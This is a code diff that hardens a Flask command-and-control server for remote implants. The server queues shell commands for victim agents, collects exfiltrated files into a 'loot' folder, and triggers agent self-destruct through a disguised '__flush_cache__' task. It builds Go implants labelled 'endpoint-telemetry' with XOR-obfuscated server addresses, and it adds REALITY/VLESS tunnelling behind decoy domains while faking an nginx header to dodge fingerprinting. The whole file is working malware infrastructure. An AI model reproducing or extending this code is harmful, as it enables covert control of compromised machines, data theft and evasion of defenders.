@@ -1,12 +1,19 @@
-from flask import Flask, request, jsonify, render_template, send_file, Response
+from flask import Flask, request, jsonify, render_template, send_file, Response, redirect, session, url_for
 from werkzeug.utils import secure_filename
-from database import get_db_connection, purge_old_nonces
+from database import get_db_connection, purge_destroyed_agents, purge_retired_build_nonces
+from storage_permissions import private_directory
+from certificate_storage import publish_certificate_bundle
 from crypto import generate_key, encrypt_payload, decrypt_payload
+from certificate_probe import (
+    measure_certificate_record, ProbeInputError, ProbeDenied,
+    REALITY_CERTIFICATE_LIMIT_BYTES,
+)
 from datetime import datetime, timezone
 import base64
 import hashlib
 import hmac
 import json
+import re
 import sqlite3
 import subprocess
 import shutil
@@ -18,29 +25,28 @@ import os
 app = Flask(__name__)
 app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100 MB upload limit
 
-# Swap out the default Werkzeug Server header so the stack isn't fingerprinted from traffic.
+# Keep the framework name out of the application-level Server header.
 @app.after_request
 def mask_server_header(response):
     response.headers["Server"] = "nginx/1.24.0"
     return response
 
-# Directory where compiled agent binaries are stored
 BUILDS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "builds")
-os.makedirs(BUILDS_DIR, exist_ok=True)
+BUILDS_DIR = private_directory(BUILDS_DIR, preserve_execute=True)
 
-# Directory for exfiltrated files (loot)
 LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
-os.makedirs(LOOT_DIR, exist_ok=True)
+LOOT_DIR = private_directory(LOOT_DIR)
 
-# Directory for staged files (to push to agents)
 STAGED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "staged")
-os.makedirs(STAGED_DIR, exist_ok=True)
+STAGED_DIR = private_directory(STAGED_DIR)
 
-# Path to the agent source code (relative to server/)
+CERTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
+CERTS_DIR = private_directory(CERTS_DIR)
+
 AGENT_SRC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "agent")
 
 
-# -- agent path init --
+# Agent route initialization.
 
 def _init_agent_paths():
     """Pull path slugs from the DB, generate them on first run."""
@@ -70,14 +76,13 @@ def _init_agent_paths():
 
 _agent_paths = _init_agent_paths()
 
-# used by route registration and the build pipeline
 AGENT_PATH_CHECKIN = _agent_paths["path_checkin"]
 AGENT_PATH_RESULT  = _agent_paths["path_result"]
 AGENT_PATH_UPLOAD  = _agent_paths["path_upload"]
 AGENT_PATH_FILES   = _agent_paths["path_files"]
 
 
-# -- operator API key --
+# Operator authentication.
 
 def _init_api_key():
     """Pull the operator API key from the DB, generate it if this is the first run."""
@@ -105,24 +110,179 @@ def _init_api_key():
 API_KEY = _init_api_key()
 
 
+def _init_session_secret():
+    """Return a stable random key used only to authenticate operator sessions."""
+    import secrets
+
+    conn = get_db_connection()
+    try:
+        row = conn.execute(
+            "SELECT value FROM server_config WHERE key = 'session_secret'"
+        ).fetchone()
+        if row:
+            return row["value"]
+        secret = secrets.token_hex(32)
+        conn.execute(
+            "INSERT INTO server_config (key, value) VALUES ('session_secret', ?)",
+            (secret,),
+        )
+        conn.commit()
+        return secret
+    finally:
+        conn.close()
+
+
+app.secret_key = _init_session_secret()
+app.config.update(
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SAMESITE="Strict",
+)
+
+
+def _operator_session_valid():
+    marker = session.get("operator_auth", "")
+    expected = hashlib.sha256(API_KEY.encode()).hexdigest()
+    return isinstance(marker, str) and hmac.compare_digest(marker, expected)
+
+
 @app.before_request
 def _require_api_key():
     """Gate every operator endpoint behind the API key."""
     if request.path.startswith("/api/"):
         provided = request.headers.get("X-API-Key", "")
-        if not hmac.compare_digest(provided, API_KEY):
+        if not _operator_session_valid() and not hmac.compare_digest(provided, API_KEY):
             return jsonify({"error": "Unauthorized"}), 401
 
 
-# -- dashboard --
+# Dashboard.
 
 @app.route("/")
 def dashboard():
     """Render the C2 operator dashboard."""
-    return render_template("index.html")
+    if not _operator_session_valid():
+        return redirect(url_for("operator_login"))
+    response = Response(render_template("index.html"))
+    response.headers["Cache-Control"] = "no-store"
+    return response
 
 
-# -- agent checkin --
+@app.route("/login", methods=["GET", "POST"])
+def operator_login():
+    """Authenticate before any dashboard HTML is served."""
+    if _operator_session_valid():
+        return redirect(url_for("dashboard"))
+
+    error = ""
+    if request.method == "POST":
+        candidate = request.form.get("api_key", "")
+        if isinstance(candidate, str) and hmac.compare_digest(candidate, API_KEY):
+            session.clear()
+            session["operator_auth"] = hashlib.sha256(API_KEY.encode()).hexdigest()
+            return redirect(url_for("dashboard"))
+        error = "Invalid operator API key."
+
+    response = Response(render_template("login.html", error=error), status=401 if error else 200)
+    response.headers["Cache-Control"] = "no-store"
+    return response
+
+
+@app.route("/logout", methods=["POST"])
+def operator_logout():
+    session.clear()
+    return redirect(url_for("operator_login"))
+
+
+# Agent check-in.
+
+def _agent_secret_hash(secret):
+    """Hash a canonical, randomly generated 32-byte agent secret."""
+    if not isinstance(secret, str) or len(secret) != 64:
+        return None
+    try:
+        raw = bytes.fromhex(secret)
+    except ValueError:
+        return None
+    if raw.hex() != secret:
+        return None
+    return hashlib.sha256(raw).hexdigest()
+
+
+def _agent_status(agent_row):
+    """Normalize agent lifecycle status; missing/NULL means active."""
+    if agent_row is None:
+        return "active"
+    try:
+        status = agent_row["status"]
+    except (KeyError, IndexError):
+        return "active"
+    return status or "active"
+
+
+def _agent_authenticated(conn, agent_id, secret, kid=None, allow_destroyed=False):
+    digest = _agent_secret_hash(secret)
+    if not digest or not isinstance(agent_id, str):
+        return False
+    agent = conn.execute(
+        "SELECT key_id, secret_hash, status FROM agents WHERE id = ?", (agent_id,)
+    ).fetchone()
+    if not agent or not agent["secret_hash"]:
+        return False
+    if _agent_status(agent) == "destroyed" and not allow_destroyed:
+        return False
+    return bool(
+        (kid is None or agent["key_id"] == kid) and
+        hmac.compare_digest(agent["secret_hash"], digest)
+    )
+
+# Payload decryption.
+
+def _get_builds_for_kid(kid: str) -> list:
+    """Look up all builds matching a given kid, newest first."""
+    conn = get_db_connection()
+    rows = conn.execute(
+        "SELECT id, encryption_key, transport_mode, decoy_domain FROM builds WHERE key_id = ? ORDER BY id DESC",
+        (kid,),
+    ).fetchall()
+    conn.close()
+    return rows
+
+
+def _decrypt_with_kid(kid: str, enc_data: str) -> tuple[dict | None, str | None, int | None]:
+    """
+    Given a kid and base64-encoded encrypted payload, find the matching build.
+    If multiple builds share the same key_id, iterates candidate keys until one decrypts
+    and validates its GCM tag.
+    Returns (payload_dict, matching_key_hex, matching_build_id).
+    If multiple builds share both the key_id and the same decryption key, matching_build_id
+    cannot be attributed without independent provenance and is returned as None.
+    """
+    candidate_builds = _get_builds_for_kid(kid)
+    if not candidate_builds:
+        return None, None, None
+
+    matching_candidates = []
+    for b in candidate_builds:
+        k = b["encryption_key"]
+        if not k:
+            continue
+        try:
+            raw = decrypt_payload(k, enc_data)
+            data = json.loads(raw)
+            matching_candidates.append((data, k, b["id"]))
+        except Exception:
+            continue
+
+    if not matching_candidates:
+        return None, None, None
+
+    if len(matching_candidates) == 1:
+        return matching_candidates[0]
+
+    # Multiple builds have keys that successfully decrypt the payload.
+    # We cannot attribute the agent to a specific build without independent provenance.
+    data, k, _ = matching_candidates[0]
+    return data, k, None
+
 
 def SyncDeviceState():
     """Decrypt the checkin envelope, register/update the agent, return pending tasks encrypted."""
@@ -133,31 +293,45 @@ def SyncDeviceState():
         return jsonify({"error": "Invalid envelope"}), 400
 
     kid = envelope["kid"]
-    key_hex = _get_key_for_kid(kid)
-    if not key_hex:
-        return jsonify({"error": "Unknown key_id"}), 403
-
     try:
         nonce_hex = base64.b64decode(envelope["data"])[:12].hex()
     except Exception:
         return jsonify({"error": "Invalid payload"}), 400
 
-    # Decrypt the inner payload
-    try:
-        raw  = decrypt_payload(key_hex, envelope["data"])
-        data = json.loads(raw)
-    except Exception:
+    # Decrypt with matching build candidate
+    data, key_hex, build_id = _decrypt_with_kid(kid, envelope["data"])
+    if data is None or key_hex is None:
+        candidate_builds = _get_builds_for_kid(kid)
+        if not candidate_builds:
+            return jsonify({"error": "Unknown key_id"}), 403
         return jsonify({"error": "Decryption failed"}), 403
 
-    if "agent_id" not in data:
-        return jsonify({"error": "Missing agent_id"}), 400
+    if (not isinstance(data, dict) or "agent_id" not in data or
+            _agent_secret_hash(data.get("agent_secret")) is None):
+        return jsonify({"error": "Missing or invalid agent identity"}), 400
 
     agent_id   = data["agent_id"]
+    if not isinstance(agent_id, str) or not agent_id or len(agent_id) > 128:
+        return jsonify({"error": "Invalid agent_id"}), 400
+    secret_hash = _agent_secret_hash(data["agent_secret"])
     hostname   = data.get("hostname", "unknown")
     agent_os   = data.get("os", "unknown")
     ip         = request.remote_addr
 
     conn = get_db_connection()
+
+    existing = conn.execute(
+        "SELECT id, key_id, secret_hash, status FROM agents WHERE id = ?", (agent_id,)
+    ).fetchone()
+    if existing and (
+        existing["key_id"] != kid or not existing["secret_hash"] or
+        not hmac.compare_digest(existing["secret_hash"], secret_hash)
+    ):
+        conn.close()
+        return jsonify({"error": "Invalid agent identity"}), 403
+    if existing and _agent_status(existing) == "destroyed":
+        conn.close()
+        return jsonify({"error": "Agent destroyed"}), 410
 
     try:
         conn.execute(
@@ -168,28 +342,31 @@ def SyncDeviceState():
         conn.close()
         return jsonify({"error": "Replay detected"}), 409
 
-    existing = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
-
     if existing:
         conn.execute(
-            "UPDATE agents SET hostname = ?, ip = ?, os = ?, last_seen = ? WHERE id = ?",
-            (hostname, ip, agent_os, datetime.now(timezone.utc).isoformat(), agent_id),
+            "UPDATE agents SET hostname = ?, ip = ?, os = ?, build_id = COALESCE(?, build_id), last_seen = ? WHERE id = ?",
+            (hostname, ip, agent_os, build_id, datetime.now(timezone.utc).isoformat(), agent_id),
         )
     else:
         conn.execute(
-            "INSERT INTO agents (id, hostname, ip, os, last_seen) VALUES (?, ?, ?, ?, ?)",
-            (agent_id, hostname, ip, agent_os, datetime.now(timezone.utc).isoformat()),
+            "INSERT INTO agents (id, hostname, ip, os, key_id, build_id, secret_hash, last_seen, status) "
+            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'active')",
+            (agent_id, hostname, ip, agent_os, kid, build_id, secret_hash,
+             datetime.now(timezone.utc).isoformat()),
         )
 
     conn.commit()
 
+    # Serialize dispatch across overlapping check-ins. A task is sent at most
+    # once; a lost response remains visible as delivery-uncertain for the operator.
+    conn.execute("BEGIN IMMEDIATE")
     tasks = conn.execute(
         "SELECT id, command, type FROM tasks WHERE agent_id = ? AND status = 'pending'",
         (agent_id,),
     ).fetchall()
 
     for task in tasks:
-        conn.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task["id"],))
+        conn.execute("UPDATE tasks SET status = 'sent' WHERE id = ? AND status = 'pending'", (task["id"],))
 
     conn.commit()
     conn.close()
@@ -203,40 +380,43 @@ def SyncDeviceState():
     return jsonify({"kid": kid, "data": enc})
 
 
-# -- crypto helpers --
-
-def _get_key_for_kid(kid: str) -> str | None:
-    """Look up the AES key for a given kid. Returns hex string or None."""
-    conn = get_db_connection()
-    row = conn.execute(
-        "SELECT encryption_key FROM builds WHERE key_id = ?", (kid,)
-    ).fetchone()
-    conn.close()
-    return row["encryption_key"] if row else None
-
-
-# -- task management --
+# Task management.
 
 @app.route("/api/task", methods=["POST"])
 def submit_task():
     """Queue a command for an agent."""
-    data = request.get_json()
+    data = request.get_json(silent=True)
 
-    if not data or "agent_id" not in data or "command" not in data:
-        return jsonify({"error": "Missing agent_id or command"}), 400
+    if not isinstance(data, dict):
+        return jsonify({"error": "Request body must be a JSON object"}), 400
+    for field in ("agent_id", "command"):
+        value = data.get(field)
+        if not isinstance(value, str) or not value.strip() or "\x00" in value:
+            return jsonify({"error": f"{field} must be a nonempty string without NUL characters"}), 400
 
     task_type = data.get("type", "shell")
     if task_type not in ("exec", "shell"):
         return jsonify({"error": "Invalid task type. Must be 'exec' or 'shell'"}), 400
 
     conn = get_db_connection()
-    cursor = conn.execute(
-        "INSERT INTO tasks (agent_id, command, type) VALUES (?, ?, ?)",
-        (data["agent_id"], data["command"], task_type),
-    )
-    task_id = cursor.lastrowid
-    conn.commit()
-    conn.close()
+    try:
+        agent = conn.execute(
+            "SELECT id, status FROM agents WHERE id = ?", (data["agent_id"],)
+        ).fetchone()
+        if not agent or _agent_status(agent) == "destroyed":
+            return jsonify({"error": "Agent not found"}), 404
+        cursor = conn.execute(
+            "INSERT INTO tasks (agent_id, command, type) VALUES (?, ?, ?)",
+            (data["agent_id"], data["command"], task_type),
+        )
+        task_id = cursor.lastrowid
+        conn.commit()
+    except sqlite3.Error:
+        conn.rollback()
+        app.logger.exception("Failed to store task")
+        return jsonify({"error": "Could not store task"}), 500
+    finally:
+        conn.close()
 
     return jsonify({"status": "ok", "task_id": task_id})
 
@@ -258,6 +438,7 @@ def get_tasks(agent_id):
                 "command": t["command"],
                 "type": t["type"],
                 "status": t["status"],
+                "delivery_uncertain": t["status"] == "sent",
                 "created_at": t["created_at"],
             }
             for t in tasks
@@ -265,7 +446,25 @@ def get_tasks(agent_id):
     })
 
 
-# -- results --
+@app.route("/api/tasks/<int:task_id>/abandon", methods=["POST"])
+def abandon_task(task_id):
+    """Operator acknowledgment that a sent task will not be automatically resent."""
+    conn = get_db_connection()
+    try:
+        conn.execute("BEGIN IMMEDIATE")
+        task = conn.execute("SELECT status FROM tasks WHERE id = ?", (task_id,)).fetchone()
+        if not task:
+            return jsonify({"error": "Task not found"}), 404
+        if task["status"] != "sent":
+            return jsonify({"error": "Only sent tasks can be abandoned"}), 409
+        conn.execute("UPDATE tasks SET status = 'abandoned' WHERE id = ?", (task_id,))
+        conn.commit()
+        return jsonify({"status": "ok", "warning": "Delivery was uncertain; creating a new task may execute the command twice"})
+    finally:
+        conn.close()
+
+
+# Results.
 
 def submit_result():
     """Decrypt the result envelope from the agent and store the output."""
@@ -276,26 +475,66 @@ def submit_result():
         return jsonify({"error": "Invalid envelope"}), 400
 
     kid = envelope["kid"]
-    key_hex = _get_key_for_kid(kid)
-    if not key_hex:
-        return jsonify({"error": "Unknown key_id"}), 403
-
     try:
         nonce_hex = base64.b64decode(envelope["data"])[:12].hex()
     except Exception:
         return jsonify({"error": "Invalid payload"}), 400
 
-    try:
-        raw  = decrypt_payload(key_hex, envelope["data"])
-        data = json.loads(raw)
-    except Exception:
+    data, key_hex, _ = _decrypt_with_kid(kid, envelope["data"])
+    if data is None or key_hex is None:
+        candidate_builds = _get_builds_for_kid(kid)
+        if not candidate_builds:
+            return jsonify({"error": "Unknown key_id"}), 403
         return jsonify({"error": "Decryption failed"}), 403
 
-    if "task_id" not in data:
-        return jsonify({"error": "Missing task_id"}), 400
+    if (not isinstance(data, dict) or
+            not isinstance(data.get("task_id"), int) or
+            isinstance(data["task_id"], bool) or
+            "agent_id" not in data or "agent_secret" not in data):
+        return jsonify({"error": "Missing result identity"}), 400
+    if data["task_id"] < 1 or data["task_id"] > 9223372036854775807:
+        return jsonify({"error": "Invalid task ID"}), 400
+
+    # New agents bind the encrypted acknowledgement to one durable result.
+    # Keep an empty report ID valid so already-built agents can transition
+    # without losing their pending results.
+    report_id = data.get("report_id", "")
+    if report_id != "" and (
+            not isinstance(report_id, str) or
+            not re.fullmatch(r"[0-9a-f]{64}", report_id)
+    ):
+        return jsonify({"error": "Invalid report ID"}), 400
+    output = data.get("output", "")
+    if not isinstance(output, str):
+        return jsonify({"error": "Result output must be a string"}), 400
+
+    def encrypted_acknowledgement(already_recorded=False):
+        acknowledgement = {
+            "status": "ok",
+            "agent_id": data["agent_id"],
+            "task_id": data["task_id"],
+            "report_id": report_id,
+            "output_sha256": hashlib.sha256(output.encode()).hexdigest(),
+            "already_recorded": already_recorded,
+        }
+        enc = encrypt_payload(key_hex, json.dumps(acknowledgement).encode())
+        return jsonify({"kid": kid, "data": enc})
 
     # Store result and handle self-destruct cleanup
     conn = get_db_connection()
+    if not _agent_authenticated(
+        conn, data["agent_id"], data["agent_secret"], kid, allow_destroyed=True
+    ):
+        conn.close()
+        return jsonify({"error": "Invalid agent identity"}), 403
+
+    conn.execute("BEGIN IMMEDIATE")
+    task = conn.execute(
+        "SELECT agent_id, command, status FROM tasks WHERE id = ?", (data["task_id"],)
+    ).fetchone()
+    if not task or task["agent_id"] != data["agent_id"] or task["status"] not in ("sent", "abandoned", "complete"):
+        conn.close()
+        return jsonify({"error": "Task not assigned to agent"}), 403
 
     try:
         conn.execute(
@@ -306,33 +545,47 @@ def submit_result():
         conn.close()
         return jsonify({"error": "Replay detected"}), 409
 
+    if task["status"] == "complete":
+        result = conn.execute("SELECT output FROM results WHERE task_id = ? ORDER BY id DESC LIMIT 1",
+                              (data["task_id"],)).fetchone()
+        if not result or result["output"] != output:
+            conn.rollback()
+            conn.close()
+            return jsonify({"error": "Task already completed with a different result"}), 409
+        conn.commit()
+        conn.close()
+        return encrypted_acknowledgement(already_recorded=True)
+
     conn.execute(
         "INSERT INTO results (task_id, output) VALUES (?, ?)",
-        (data["task_id"], data.get("output", "")),
+        (data["task_id"], output),
     )
     conn.execute("UPDATE tasks SET status = 'complete' WHERE id = ?", (data["task_id"],))
-    conn.commit()
 
-    task = conn.execute(
-        "SELECT agent_id, command FROM tasks WHERE id = ?", (data["task_id"],)
-    ).fetchone()
-
-    if task and task["command"] == "__flush_cache__":
+    if task["command"] == "__flush_cache__":
+        # Keep a tombstone so lost acknowledgments can retry idempotently.
+        # Retain only this flush task/result; drop the rest of the agent's history.
         agent_id = task["agent_id"]
+        flush_task_id = data["task_id"]
         conn.execute("""
             DELETE FROM results WHERE task_id IN (
-                SELECT id FROM tasks WHERE agent_id = ?
+                SELECT id FROM tasks WHERE agent_id = ? AND id != ?
             )
-        """, (agent_id,))
-        conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
-        conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
-        conn.commit()
+        """, (agent_id, flush_task_id))
+        conn.execute(
+            "DELETE FROM tasks WHERE agent_id = ? AND id != ?",
+            (agent_id, flush_task_id),
+        )
+        conn.execute(
+            "UPDATE agents SET status = 'destroyed', destroyed_at = CURRENT_TIMESTAMP "
+            "WHERE id = ?",
+            (agent_id,),
+        )
 
+    conn.commit()
     conn.close()
 
-    # Encrypt the response
-    enc = encrypt_payload(key_hex, json.dumps({"status": "ok"}).encode())
-    return jsonify({"kid": kid, "data": enc})
+    return encrypted_acknowledgement()
 
 
 @app.route("/api/results/<int:task_id>", methods=["GET"])
@@ -357,25 +610,51 @@ def get_results(task_id):
     })
 
 
-# -- agents --
+# Agents.
 
 @app.route("/api/agents", methods=["GET"])
 def get_agents():
-    """Return all agents as JSON."""
+    """Return all agents as JSON, enriched with transport metadata from builds."""
     conn = get_db_connection()
-    agents = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
+
+    # Single query: LEFT JOIN fetches only the build metadata relevant to
+    # the returned agents using the idx_builds_key_id index.
+    # An explicit build ID wins. Legacy agents without one can only inherit
+    # metadata when their key identifies exactly one build.
+    # 1. Exactly one row per agent (API-03), avoiding duplicates when multiple
+    #    builds share a key_id.
+    # 2. Performance does not scale with unrelated build history (PERF-01).
+    # 3. Agents with NULL or empty key_id do not match any build.
+    rows = conn.execute("""
+        SELECT a.id, a.hostname, a.ip, a.os, a.last_seen,
+               COALESCE(b.transport_mode, '') AS transport_mode,
+               b.decoy_domain
+        FROM agents a
+        LEFT JOIN builds b ON b.id = COALESCE(
+            a.build_id,
+            CASE WHEN a.key_id IS NOT NULL AND a.key_id != '' THEN (
+                SELECT b2.id FROM builds b2 WHERE b2.key_id = a.key_id
+                GROUP BY b2.key_id HAVING COUNT(*) = 1
+            ) END
+        )
+        WHERE COALESCE(a.status, 'active') != 'destroyed'
+        ORDER BY a.last_seen DESC
+    """).fetchall()
+
     conn.close()
 
     return jsonify({
         "agents": [
             {
-                "id": a["id"],
-                "hostname": a["hostname"],
-                "ip": a["ip"],
-                "os": a["os"],
-                "last_seen": a["last_seen"],
+                "id": r["id"],
+                "hostname": r["hostname"],
+                "ip": r["ip"],
+                "os": r["os"],
+                "last_seen": r["last_seen"],
+                "transport_mode": r["transport_mode"] or "",
+                "decoy_domain": r["decoy_domain"],
             }
-            for a in agents
+            for r in rows
         ]
     })
 
@@ -385,9 +664,9 @@ def delete_agent(agent_id):
     """Queue a self-destruct for the agent. Record stays in the DB until the agent checks in and wipes itself."""
     conn = get_db_connection()
 
-    # Check if agent exists
-    agent = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
-    if not agent:
+    # Check if agent exists and is still active
+    agent = conn.execute("SELECT id, status FROM agents WHERE id = ?", (agent_id,)).fetchone()
+    if not agent or _agent_status(agent) == "destroyed":
         conn.close()
         return jsonify({"error": "Agent not found"}), 404
 
@@ -429,14 +708,16 @@ def force_delete_agent(agent_id):
     return jsonify({"status": "ok"})
 
 
-# -- stats --
+# Statistics.
 
 @app.route("/api/stats", methods=["GET"])
 def get_stats():
     """Return aggregate dashboard statistics."""
     conn = get_db_connection()
 
-    agent_count = conn.execute("SELECT COUNT(*) as c FROM agents").fetchone()["c"]
+    agent_count = conn.execute(
+        "SELECT COUNT(*) as c FROM agents WHERE COALESCE(status, 'active') != 'destroyed'"
+    ).fetchone()["c"]
     pending_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'pending'").fetchone()["c"]
     sent_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'sent'").fetchone()["c"]
     complete_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'complete'").fetchone()["c"]
@@ -453,7 +734,7 @@ def get_stats():
     })
 
 
-# -- build --
+# Agent builds.
 
 def _xor_encrypt(key: bytes, plaintext: str) -> str:
     """XOR-encrypt a plaintext string with a multi-byte key, return hex."""
@@ -467,7 +748,7 @@ def _compute_cert_pin():
 
     Returns None if no certificate exists yet.
     """
-    cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.crt")
+    cert_path, _ = _active_tls_paths()
     if not os.path.exists(cert_path):
         return None
 
@@ -482,12 +763,24 @@ def _compute_cert_pin():
     return hashlib.sha256(spki_bytes).hexdigest()
 
 
+def _active_tls_paths():
+    """Use an atomically replaced PEM bundle, or an existing legacy pair."""
+    bundle = os.path.join(CERTS_DIR, "server.pem")
+    if os.path.isfile(bundle):
+        return bundle, bundle
+    return os.path.join(CERTS_DIR, "server.crt"), os.path.join(CERTS_DIR, "server.key")
+
+
 def _generate_config_go(server_url, jitter_min, jitter_max, persist_method,
                         profile_id=1, locale="en-US,en;q=0.9",
                         key_hex="", key_id="",
                         path_checkin="/api/checkin", path_result="/api/result",
                         path_upload="/api/upload", path_files="/api/files/",
-                        cert_pin=""):
+                        cert_pin="",
+                        transport_mode="http",
+                        reality_vps_addr="", decoy_domain="",
+                        reality_pubkey="", reality_shortid="",
+                        vless_uuid=""):
     """Generate a config.go file with the given settings."""
 
     # fresh XOR key for this build
@@ -495,6 +788,7 @@ def _generate_config_go(server_url, jitter_min, jitter_max, persist_method,
     xor_key_hex = xor_key.hex()
 
     persistence = persist_method != "none"
+    is_reality = transport_mode == "reality"
 
     # encrypt sensitive strings so they don't show up as plaintext in the binary
     enc_server_url   = _xor_encrypt(xor_key, server_url)
@@ -507,121 +801,219 @@ def _generate_config_go(server_url, jitter_min, jitter_max, persist_method,
     enc_cert_pin     = _xor_encrypt(xor_key, cert_pin) if cert_pin else ""
     enc_update_strat = _xor_encrypt(xor_key, persist_method) if persistence else ""
 
+    # REALITY-specific obfuscated strings (empty when not REALITY mode)
+    enc_transport_mode = _xor_encrypt(xor_key, transport_mode) if is_reality else ""
+    enc_vps_addr       = _xor_encrypt(xor_key, reality_vps_addr) if is_reality else ""
+    enc_decoy_domain   = _xor_encrypt(xor_key, decoy_domain) if is_reality else ""
+    enc_pubkey         = _xor_encrypt(xor_key, reality_pubkey) if is_reality else ""
+    enc_shortid        = _xor_encrypt(xor_key, reality_shortid) if is_reality else ""
+    enc_vless_uuid     = _xor_encrypt(xor_key, vless_uuid) if is_reality else ""
+
+    # Map browser profile IDs to uTLS fingerprint names for REALITY
+    fingerprint_map = {1: "chrome", 2: "chrome", 3: "firefox", 4: "firefox", 5: "safari"}
+    reality_fingerprint = fingerprint_map.get(profile_id, "chrome")
+
+    # Conditional import: only include the reality package for REALITY builds.
+    # Non-REALITY builds never reference it, so no unused-import error and no
+    # binary size impact from the reality/ source files sitting in the tree.
+    if is_reality:
+        imports_block = '''import (
+\t"crypto/rand"
+\t"encoding/base64"
+\t"encoding/hex"
+\t"fmt"
+\t"net/http"
+\t"strings"
+\t"time"
+
+\t"endpoint-telemetry/funcs"
+\t"endpoint-telemetry/funcs/reality"
+)'''
+    else:
+        imports_block = '''import (
+\t"crypto/rand"
+\t"crypto/tls"
+\t"encoding/hex"
+\t"fmt"
+\t"net/http"
+\t"strings"
+\t"time"
+
+\t"endpoint-telemetry/funcs"
+)'''
+
+    # REALITY variable declarations (only present in REALITY builds)
+    reality_vars = ""
+    if is_reality:
+        reality_vars = f"""
+\t// REALITY transport credentials (XOR-obfuscated)
+\tTransportMode       string
+\tRealityVPSAddr      string
+\tRealityDecoyDomain  string
+\tRealityPubKey       string
+\tRealityShortID      string
+\tVlessUUID           string"""
+
+    # REALITY initialization block for InitializeTelemetry()
+    if is_reality:
+        transport_init = f'''\t// -- REALITY transport --
+\tTransportMode      = funcs.ResolveConfig(obfKey, "{enc_transport_mode}")
+\tRealityVPSAddr     = funcs.ResolveConfig(obfKey, "{enc_vps_addr}")
+\tRealityDecoyDomain = funcs.ResolveConfig(obfKey, "{enc_decoy_domain}")
+\tRealityPubKey      = funcs.ResolveConfig(obfKey, "{enc_pubkey}")
+\tRealityShortID     = funcs.ResolveConfig(obfKey, "{enc_shortid}")
+\tVlessUUID          = funcs.ResolveConfig(obfKey, "{enc_vless_uuid}")
+
+\t// Decode REALITY credentials from their string representations
+\tpubKeyBytes, err := base64.RawURLEncoding.DecodeString(RealityPubKey)
+\tif err != nil {{
+\t\t// Try standard base64 as fallback
+\t\tpubKeyBytes, err = base64.StdEncoding.DecodeString(RealityPubKey)
+\t\tif err != nil {{
+\t\t\tpanic("config: invalid REALITY public key: " + err.Error())
+\t\t}}
+\t}}
+\tshortIdBytes, err := hex.DecodeString(RealityShortID)
+\tif err != nil {{
+\t\tpanic("config: invalid REALITY short ID: " + err.Error())
+\t}}
+\tuuidCleaned := strings.ReplaceAll(VlessUUID, "-", "")
+\tuuidBytes, err := hex.DecodeString(uuidCleaned)
+\tif err != nil || len(uuidBytes) != 16 {{
+\t\tpanic("config: invalid VLESS UUID")
+\t}}
+
+\trealityCfg := &reality.Config{{
+\t\tServerName:  RealityDecoyDomain,
+\t\tFingerprint: "{reality_fingerprint}",
+\t\tPublicKey:   pubKeyBytes,
+\t\tShortId:     shortIdBytes,
+\t}}
+\tbaseTransport := reality.NewHTTPTransport(&reality.TransportConfig{{
+\t\tVPS:      RealityVPSAddr,
+\t\tReality:  realityCfg,
+\t\tUUID:     uuidBytes,
+\t\tDestIP:   "127.0.0.1",
+\t\tDestPort: 5000,
+\t}})'''
+    else:
+        transport_init = '''\t// Clone the default transport so we can set TLS options without touching
+\t// the global default. If a pin is set, disable CA verification (which would
+\t// reject self-signed certs) and replace it with the SPKI pin check.
+\tbaseTransport := http.DefaultTransport.(*http.Transport).Clone()
+
+\tif CertPin != "" {
+\t\tbaseTransport.TLSClientConfig = &tls.Config{
+\t\t\tInsecureSkipVerify: true,
+\t\t\tVerifyPeerCertificate: funcs.MakePinVerifier(CertPin),
+\t\t}
+\t}'''
+
     return f'''package main
 
-import (
-	"crypto/rand"
-	"crypto/tls"
-	"encoding/hex"
-	"fmt"
-	"net/http"
-	"strings"
-	"time"
-
-	"endpoint-telemetry/funcs"
-)
+{imports_block}
 
 var (
-	// XOR key for runtime string decoding (generated per build)
-	obfKey = parseDiagnosticKey("{xor_key_hex}")
+\t// XOR key for runtime string decoding (generated per build)
+\tobfKey = parseDiagnosticKey("{xor_key_hex}")
 
-	// Sensitive strings decoded at init time
-	TelemetryEndpoint string
-	PathCheckin       string
-	PathResult        string
-	PathUpload        string
-	PathFiles         string
-	FlushCommand      string
-	ServiceTag        string
-	UpdateStrategy    string
+\t// Sensitive strings decoded at init time
+\tTelemetryEndpoint string
+\tPathCheckin       string
+\tPathResult        string
+\tPathUpload        string
+\tPathFiles         string
+\tFlushCommand      string
+\tServiceTag        string
+\tUpdateStrategy    string
 
-	SyncDelayMin  = {jitter_min} * time.Second
-	SyncDelayMax  = {jitter_max} * time.Second
-	ProfileID     = {profile_id}
-	Locale        = "{locale}"
-	EndpointID    string
-	EnablePersist = {str(persistence).lower()}
+\tSyncDelayMin  = {jitter_min} * time.Second
+\tSyncDelayMax  = {jitter_max} * time.Second
+\tProfileID     = {profile_id}
+\tLocale        = "{locale}"
+\tEndpointID    string
+\tAgentSecret   string
+\tEnablePersist = {str(persistence).lower()}
 
-	// Per-build AES-256-GCM key
-	KeyID         = "{key_id}"
-	EncryptionKey = parseDiagnosticKey("{key_hex}")
+\t// Per-build AES-256-GCM key
+\tKeyID         = "{key_id}"
+\tEncryptionKey = parseDiagnosticKey("{key_hex}")
 
-	// SPKI SHA-256 pin of the server TLS certificate (empty = no pinning)
-	CertPin string
+\t// SPKI SHA-256 pin of the server TLS certificate (empty = no pinning)
+\tCertPin string{reality_vars}
 )
 
 // parseDiagnosticKey decodes a hex string into []byte, panicking on failure.
 // If this panics at startup the binary was built with a malformed key.
